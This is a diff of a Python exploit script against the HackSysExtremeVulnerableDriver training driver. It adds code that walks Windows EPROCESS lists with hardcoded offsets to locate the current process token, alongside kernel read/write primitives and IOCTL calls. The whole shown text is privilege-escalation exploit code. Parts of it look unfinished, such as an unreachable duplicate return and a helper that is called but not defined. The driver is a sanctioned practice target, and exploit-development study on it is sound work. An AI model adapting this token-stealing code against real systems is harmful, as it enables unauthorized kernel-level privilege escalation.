@@ -206,7 +206,7 @@ def writePrimitive(driver_handle, what=None, where=None):
 def readPrimitive(driver_handle, system_kernel_base_pointer, where=None):
 
     #We've created a block of memory at the top of userland via dwStatus
-    what_addr = system_kernel_base_pointer + 0x358 #some shit here system token address
+    what_addr = system_kernel_base_pointer + 0x358 #system token address
     where = 0x000000001a001000
 
     IoControlCode = 0x0022200B
@@ -237,8 +237,41 @@ def readPrimitive(driver_handle, system_kernel_base_pointer, where=None):
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
     return read_value
+############################## GET CURRENT PROCESS TOKEN OFFSET ################################
+unique_process_id_offset = 0x2e0
+active_process_links_offset = 0x2e8
+token_offset = 0x358
+	
+# Get EPROCESS of current process
+def get_current_eprocess(system_kernel_base_pointer):
+	""" Returns ptr to Current EPROCESS structure """
+	flink = c_ulonglong()
+	read_virtual(system_kernel_base_pointer + active_process_links_offset, byref(flink), sizeof(flink));	
+	
+	current_pEPROCESS = 0
+	while (1):
+		unique_process_id = c_ulonglong(0)
+		
+		# Adjust EPROCESS pointer for next entry
+		system_kernel_base_pointer = flink.value - unique_process_id_offset - 0x8
+		
+		# Get PID
+		read_virtual(system_kernel_base_pointer + unique_process_id_offset, byref(unique_process_id), sizeof(unique_process_id));	
+		
+		# Check if we're in the current process
+		if (os.getpid() == unique_process_id.value):
+			current_pEPROCESS = system_kernel_base_pointer
+			break
+			
+		read_virtual(system_kernel_base_pointer + active_process_links_offset, byref(flink), sizeof(flink));	
+		
+		# If next same as last, we've reached the end
+		if (system_kernel_base_pointer == flink.value - unique_process_id_offset - 0x8):
+			break
+		
+	return current_pEPROCESS
 
-########################################### MAIN ##############################################
+########################################### MAIN ###############################################
 def executeOverwrite():
     driver_handle = kernel32.CreateFileA(
         '\\\\.\\HackSysExtremeVulnerableDriver',
